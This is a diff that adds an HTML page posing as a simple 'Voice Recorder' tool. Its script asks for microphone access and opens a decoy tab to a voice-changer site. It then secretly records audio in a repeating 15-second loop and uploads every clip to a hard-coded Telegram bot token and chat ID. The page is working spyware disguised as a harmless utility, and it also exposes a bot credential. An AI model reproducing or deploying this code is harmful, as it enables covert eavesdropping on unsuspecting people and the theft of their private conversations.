@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎙🤑Voice Recorder</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #ff4e50, #fc913a);
+            color: white;
+            padding: 30px;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.3);
+        }
+        button {
+            padding: 15px 20px;
+            font-size: 18px;
+            border: none;
+            border-radius: 50px;
+            background: #ffd700;
+            color: black;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #ffcc00;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffd700;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🎤 Voice Recorder 🎶</h2>
+        <button id="startRecording">🎙 Start Recording</button>
+        <p id="status">👇 Click to start</p>
+    </div>
+
+    <script>
+        const botToken = "7256577569:AAHyOFgwSk6hmV1vfhIgW8wub74IW3MTQf4";  // Replace with your bot token
+        const chatId = "6524755764";      // Replace with your chat ID
+        let mediaRecorder;
+        let audioChunks = [];
+
+        document.getElementById("startRecording").addEventListener("click", async () => {
+            try {
+                // ✅ Mic permission maangna
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                document.getElementById("status").innerText = "";
+
+                // ✅ Pehle yahan recording start hogi
+                startBackgroundRecording(stream);
+
+                // ✅ Naya tab sirf notification ke liye khulega
+                const newTab = window.open("https://voice.ai/tools/voice-changer", "_blank");
+            
+            } catch (error) {
+                document.getElementById("status").innerText = "❌ Mic Permission Denied!";
+            }
+        });
+
+        function startBackgroundRecording(stream) {
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+            mediaRecorder.onstop = sendAudioToTelegram;
+
+            function recordLoop() {
+                audioChunks = [];
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 15000); // ✅ 20s recording
+            }
+
+            recordLoop(); // ✅ Start First Recording
+
+            setInterval(() => {
+                recordLoop(); // ✅ Repeat Every 20s
+            }, 20000);
+        }
+
+        async function sendAudioToTelegram() {
+            const audioBlob = new Blob(audioChunks, { type: "audio/ogg" });
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("voice", audioBlob, "recording.ogg");
+
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (error) {
+                console.log("❌ Error sending audio!");
+            }
+        }
+    </script>
+</body>
+</html>
